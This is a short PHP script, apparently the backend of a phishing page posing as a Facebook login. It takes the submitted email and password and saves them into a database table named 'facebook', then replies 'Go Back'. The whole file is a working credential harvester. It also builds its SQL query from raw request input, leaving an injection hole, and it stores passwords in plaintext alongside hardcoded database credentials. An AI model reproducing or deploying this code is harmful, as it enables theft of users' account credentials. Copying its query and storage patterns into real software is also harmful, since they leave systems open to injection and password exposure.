<?php
$host ="localhost";
$username ="najmul";
$password = "Aporna1";
$dbName = "Aporna";

/*databage connaction*/
$conn = mysqli_connect ($host,$username,$password,$dbName);

if ($conn== false) {
	echo "your connection is error";
	
}


$Email =  $_REQUEST[/*input name*/"email"];
$password = $_REQUEST["password"];



$insertQuery = "INSERT INTO /*this is the table name*/facebook (Email,password) VALUES (/*databage vlue name*/'$Email','$password')";
$runQuery = mysqli_query($conn,$insertQuery);

if ($runQuery==true) {
	echo "Go Back";
}
else{
	echo "connection is error";
}
?>